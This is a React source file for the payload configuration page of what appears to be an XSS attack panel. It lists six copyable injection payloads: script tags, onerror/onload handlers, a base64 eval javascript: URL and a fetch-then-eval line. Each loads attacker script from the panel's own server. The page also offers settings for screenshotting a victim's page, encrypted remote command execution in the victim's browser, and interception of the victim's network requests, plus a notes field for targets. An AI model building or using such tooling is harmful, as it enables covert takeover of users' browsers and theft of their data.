'use client';

import { useEffect, useState } from 'react';
import {
    Copy,
    Check,
    Settings,
    Code,
    FileText,
    Loader2,
    Save,
    Key,
    Shield,
    Lock,
    FlaskConical,
    Radio
} from 'lucide-react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Switch } from '@/components/ui/switch';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { cn } from '@/lib/utils';

type TabType = 'settings' | 'payloads' | 'notes';

interface SettingsData {
    screenshot_enabled: string;
    persistent_enabled: string;
    persistent_key: string;
    advanced_persistent_enabled: string;
    notes: string;
}

export default function PayloadsPage() {
    const [activeTab, setActiveTab] = useState<TabType>('settings');
    const [copiedIndex, setCopiedIndex] = useState<number | null>(null);
    const [loading, setLoading] = useState(true);
    const [saving, setSaving] = useState(false);
    const [saved, setSaved] = useState(false);
    const [settings, setSettings] = useState<SettingsData>({
        screenshot_enabled: 'true',
        persistent_enabled: 'false',
        persistent_key: '',
        advanced_persistent_enabled: 'false',
        notes: '',
    });
    const [generatingKey, setGeneratingKey] = useState(false);

    const baseUrl = typeof window !== 'undefined' ? window.location.origin : '';

    useEffect(() => {
        fetchSettings();
    }, []);

    const fetchSettings = async () => {
        try {
            setLoading(true);
            const res = await fetch('/api/settings');
            if (res.ok) {
                const data = await res.json();
                setSettings({
                    screenshot_enabled: data.settings.screenshot_enabled || 'true',
                    persistent_enabled: data.settings.persistent_enabled || 'false',
                    persistent_key: data.settings.persistent_key || '',
                    advanced_persistent_enabled: data.settings.advanced_persistent_enabled || 'false',
                    notes: data.settings.notes || '',
                });
            }
        } finally {
            setLoading(false);
        }
    };

    const handleSave = async () => {
        setSaving(true);
        const res = await fetch('/api/settings', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ settings }),
        });
        if (res.ok) {
            setSaved(true);
            setTimeout(() => setSaved(false), 2000);
        }
        setSaving(false);
    };

    const toggleSetting = (key: keyof SettingsData) => {
        if (key === 'notes' || key === 'persistent_key') return;
        setSettings({
            ...settings,
            [key]: settings[key] === 'true' ? 'false' : 'true',
        });
    };

    const generateEncryptionKey = async () => {
        setGeneratingKey(true);
        try {
            // Generate a random 256-bit key (32 bytes) as hex string
            const array = new Uint8Array(32);
            crypto.getRandomValues(array);
            const key = Array.from(array).map(b => b.toString(16).padStart(2, '0')).join('');
            setSettings({ ...settings, persistent_key: key });
        } finally {
            setGeneratingKey(false);
        }
    };

    const payloads = [
        {
            name: 'Basic Script',
            code: `<script src="${baseUrl}/"></script>`,
            description: 'Simple script tag injection',
        },
        {
            name: 'Image OnError',
            code: `<img src=x onerror="var s=document.createElement('script');s.src='${baseUrl}/';document.head.appendChild(s)">`,
            description: 'Image with onerror handler',
        },
        {
            name: 'SVG OnLoad',
            code: `<svg onload="var s=document.createElement('script');s.src='${baseUrl}/';document.head.appendChild(s)">`,
            description: 'SVG with onload event',
        },
        {
            name: 'JavaScript URL',
            code: `javascript:eval(atob('${typeof window !== 'undefined' ? btoa(`var s=document.createElement('script');s.src='${baseUrl}/';document.head.appendChild(s)`) : ''}'))`,
            description: 'Base64 encoded JavaScript URL',
        },
        {
            name: 'Fetch Inline',
            code: `<script>fetch('${baseUrl}/').then(r=>r.text()).then(eval)</script>`,
            description: 'Fetch and execute payload',
        },
        {
            name: 'Event Handler',
            code: `<body onload="var s=document.createElement('script');s.src='${baseUrl}/';document.head.appendChild(s)">`,
            description: 'Body onload event handler',
        },
    ];

    const handleCopy = async (text: string, index: number) => {
        await navigator.clipboard.writeText(text);
        setCopiedIndex(index);
        setTimeout(() => setCopiedIndex(null), 2000);
    };

    const tabs = [
        { id: 'settings' as TabType, label: 'Settings', icon: Settings },
        { id: 'payloads' as TabType, label: 'Scripts', icon: Code },
        { id: 'notes' as TabType, label: 'Notes', icon: FileText },
    ];

    if (loading) {
        return (
            <div className="flex items-center justify-center py-20">
                <Loader2 className="w-8 h-8 animate-spin text-emerald-500" />
            </div>
        );
    }

    return (
        <div className="space-y-4 animate-fade-in max-w-7xl mx-auto pb-10">
            {/* Header */}
            <div className="flex items-center justify-between">
                <div>
                    <h1 className="text-2xl font-bold tracking-tight text-white">Payload Configuration</h1>
                    <p className="text-muted-foreground text-sm mt-0.5">
                        Configure payload behavior and view injection examples
                    </p>
                </div>
                <Button
                    onClick={handleSave}
                    disabled={saving}
                    className="gap-1.5 bg-emerald-500 hover:bg-emerald-600 text-white rounded text-sm h-9 px-4"
                >
                    {saving ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                    ) : saved ? (
                        'Saved!'
                    ) : (
                        <>
                            <Save className="w-4 h-4" />
                            Save Changes
                        </>
                    )}
                </Button>
            </div>

            {/* Tabs */}
            <div className="flex space-x-0.5 rounded bg-[#18181c] p-0.5 w-fit border border-[#27272a]">
                {tabs.map((tab) => {
                    const Icon = tab.icon;
                    return (
                        <button
                            key={tab.id}
                            onClick={() => setActiveTab(tab.id)}
                            className={cn(
                                "flex items-center gap-1.5 px-3 py-1.5 rounded text-sm font-medium transition-all",
                                activeTab === tab.id
                                    ? "bg-[#27272a] text-white shadow-sm"
                                    : "text-muted-foreground hover:text-white"
                            )}
                        >
                            <Icon className="w-4 h-4" />
                            {tab.label}
                        </button>
                    );
                })}
            </div>

            {/* Tab Content */}
            <Card className="border border-[#27272a] bg-[#18181c] text-white rounded-lg overflow-hidden">
                {/* Settings Tab */}
                {activeTab === 'settings' && (
                    <CardContent className="p-4 space-y-4">
                        <div className="flex items-center justify-between">
                            <div className="space-y-0.5">
                                <h3 className="font-medium text-sm">Screenshot Capture</h3>
                                <p className="text-sm text-muted-foreground">
                                    Capture screenshot of victim&apos;s page when XSS triggers
                                </p>
                            </div>
                            <Switch
                                checked={settings.screenshot_enabled === 'true'}
                                onCheckedChange={() => toggleSetting('screenshot_enabled')}
                            />
                        </div>

                        <div className="flex items-center justify-between border-t border-white/5 pt-4">
                            <div className="space-y-0.5">
                                <div className="flex items-center gap-1.5">
                                    <h3 className="font-medium text-sm">Persistent Mode</h3>
                                </div>
                                <p className="text-sm text-muted-foreground">
                                    Keep connection open for remote command execution
                                </p>
                            </div>
                            <Switch
                                checked={settings.persistent_enabled === 'true'}
                                onCheckedChange={() => toggleSetting('persistent_enabled')}
                            />
                        </div>

                        {/* Encryption Key - only show when persistent mode is enabled */}
                        {settings.persistent_enabled === 'true' && (
                            <div className="border-t border-white/5 pt-4 space-y-3">
                                <div className="flex items-center gap-2">
                                    <Lock className="w-4 h-4 text-emerald-500" />
                                    <h3 className="font-medium text-sm">AES Encryption Key</h3>
                                    <Badge variant="secondary" className="text-xs h-5 px-1.5 bg-emerald-500/10 text-emerald-500 hover:bg-emerald-500/20 border-none">
                                        <Shield className="w-3 h-3 mr-1" />
                                        Secure
                                    </Badge>
                                </div>
                                <p className="text-sm text-muted-foreground">
                                    Commands and responses are encrypted with AES-256. The client cannot read the data.
                                </p>
                                <div className="flex gap-2">
                                    <Input
                                        value={settings.persistent_key}
                                        onChange={(e) => setSettings({ ...settings, persistent_key: e.target.value })}
                                        placeholder="Click generate to create a new encryption key"
                                        className="bg-[#09090b] border-white/10 text-white font-mono text-xs focus:border-emerald-500/50"
                                    />
                                    <Button
                                        type="button"
                                        onClick={generateEncryptionKey}
                                        disabled={generatingKey}
                                        variant="outline"
                                        className="shrink-0 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10"
                                    >
                                        {generatingKey ? (
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                        ) : (
                                            <>
                                                <Key className="w-4 h-4 mr-1.5" />
                                                Generate
                                            </>
                                        )}
                                    </Button>
                                </div>
                                {!settings.persistent_key && (
                                    <p className="text-xs text-amber-400 flex items-center gap-1">
                                        <Shield className="w-3 h-3" />
                                        Generate an encryption key to secure your persistent sessions
                                    </p>
                                )}
                                {settings.persistent_key && (
                                    <p className="text-xs text-emerald-400 flex items-center gap-1">
                                        <Check className="w-3 h-3" />
                                        Encryption enabled - commands &amp; responses are protected
                                    </p>
                                )}

                                {/* Traffic Interception Mode */}
                                <div className="border-t border-white/5 pt-4 mt-4">
                                    <div className="flex items-center justify-between">
                                        <div className="space-y-0.5">
                                            <div className="flex items-center gap-2">
                                                <h3 className="font-medium text-sm">Traffic Interception</h3>
                                                <Badge variant="secondary" className="text-xs h-5 px-1.5 bg-amber-500/10 text-amber-400 hover:bg-amber-500/20 border-none">
                                                    <FlaskConical className="w-3 h-3 mr-1" />
                                                    Experimental
                                                </Badge>
                                            </div>
                                            <p className="text-sm text-muted-foreground">
                                                Multi-page persistence with network request capture
                                            </p>
                                        </div>
                                        <Switch
                                            checked={settings.advanced_persistent_enabled === 'true'}
                                            onCheckedChange={() => toggleSetting('advanced_persistent_enabled')}
                                        />
                                    </div>

                                    {/* Feature list when enabled */}
                                    {settings.advanced_persistent_enabled === 'true' && (
                                        <div className="mt-3 ml-1 pl-3 border-l border-amber-500/30 space-y-2">
                                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
                                                <Radio className="w-3.5 h-3.5 text-amber-400" />
                                                <span>Popup controller for cross-page persistence</span>
                                            </div>
                                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
                                                <Radio className="w-3.5 h-3.5 text-amber-400" />
                                                <span>Auto-intercept fetch/XHR requests</span>
                                            </div>
                                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
                                                <Radio className="w-3.5 h-3.5 text-amber-400" />
                                                <span>Capture request/response data in real-time</span>
                                            </div>
                                            <p className="text-xs text-amber-400/70 mt-2">
                                                ⚠️ May be blocked by popup blockers. Falls back to single-page mode if blocked.
                                            </p>
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}

                        <div className="bg-[#1c1c1f] border border-white/5 rounded p-3 mt-4">
                            <p className="text-sm text-muted-foreground">
                                <strong className="text-emerald-500 pr-1.5">Endpoint:</strong>
                                <code className="bg-black/30 px-2 py-0.5 rounded border border-white/5 text-xs font-mono text-white">{baseUrl}/</code>
                            </p>
                        </div>
                    </CardContent>
                )}

                {/* Payloads Tab */}
                {activeTab === 'payloads' && (
                    <div className="divide-y divide-white/5">
                        {payloads.map((payload, index) => (
                            <div key={index} className="p-4 hover:bg-white/5 transition-colors">
                                <div className="flex items-start justify-between gap-3">
                                    <div className="flex-1 min-w-0 space-y-1.5">
                                        <div>
                                            <h3 className="font-medium text-white text-sm">{payload.name}</h3>
                                            <p className="text-sm text-muted-foreground">{payload.description}</p>
                                        </div>
                                        <div className="relative group">
                                            <code className="block text-sm bg-[#09090b] p-3 rounded font-mono overflow-x-auto border border-white/5 text-emerald-400">
                                                {payload.code}
                                            </code>
                                        </div>
                                    </div>
                                    <Button
                                        variant="outline"
                                        size="icon"
                                        onClick={() => handleCopy(payload.code, index)}
                                        className="shrink-0 border-white/10 hover:bg-white/10 text-muted-foreground hover:text-white rounded h-8 w-8"
                                    >
                                        {copiedIndex === index ? (
                                            <Check className="w-4 h-4 text-emerald-500" />
                                        ) : (
                                            <Copy className="w-4 h-4" />
                                        )}
                                    </Button>
                                </div>
                            </div>
                        ))}
                    </div>
                )}

                {/* Notes Tab */}
                {activeTab === 'notes' && (
                    <CardContent className="p-4 space-y-3">
                        <Textarea
                            value={settings.notes}
                            onChange={(e) => setSettings({ ...settings, notes: e.target.value })}
                            placeholder="Add your notes here... (targets, findings, reminders)"
                            className="min-h-[240px] font-mono text-sm bg-[#09090b] border-white/10 rounded focus:ring-emerald-500/50"
                        />
                        <p className="text-xs text-muted-foreground">
                            Notes are saved to database and persist across sessions
                        </p>
                    </CardContent>
                )}
            </Card>
        </div>
    );
}
